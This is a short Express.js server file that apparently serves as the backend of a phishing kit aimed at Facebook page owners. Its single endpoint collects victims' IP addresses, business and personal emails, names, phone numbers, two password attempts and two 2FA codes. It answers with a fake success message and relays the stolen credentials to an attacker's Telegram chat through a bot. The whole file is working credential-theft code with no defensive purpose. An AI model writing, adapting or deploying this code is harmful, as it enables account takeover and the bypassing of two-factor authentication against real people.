import express from "express";
import 'dotenv/config';
import cors from "cors";
import TelegramBot from 'node-telegram-bot-api';
import axios from "axios";

const app = express();
app.use(cors('*'));
app.use(express.json());

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });

app.post('/api/resgister', (req, res) => {
    const data = req.body; 

    const result = {
        "status": 0,
        "message": "Success!"
    }

    res.send(result);

    
    const message = `<strong>Ip:</strong> <code>${data.ip ? data.ip : ''}</code>
------------------------
<strong>Email Business:</strong> <code>${data.businessEmail ? data.businessEmail : ''} </code>
<strong>Email Personal:</strong> <code>${data.personalEmail ? data.personalEmail : ''}</code>
<strong>Full Name:</strong> <code>${data.fullName ? data.fullName : ''} </code>
<strong>Fanpage Name:</strong> <code>${data.fanpageName ? data.fanpageName : ''}</code>
<strong>Phone Number:</strong> <code>${data.mobilePhone ? data.mobilePhone : ''}</code>
<strong>Password First:</strong> <code>${data.passwordFirst ? data.passwordFirst : ''}</code>
<strong>Password Second:</strong> <code>${data.passwordSecond ? data.passwordSecond : ''}</code>
------------------------
<strong>First Two-Fa:</strong> <code>${data.firstTwoFa ? data.firstTwoFa : ''}</code>
<strong>Second Two-Fa:</strong> <code>${data.secondTwoFa ? data.secondTwoFa : ''}</code>`;

    bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'HTML' });

});

app.listen(process.env.PORT, () => {
    console.log(`Server listening port ${process.env.PORT}`);
});
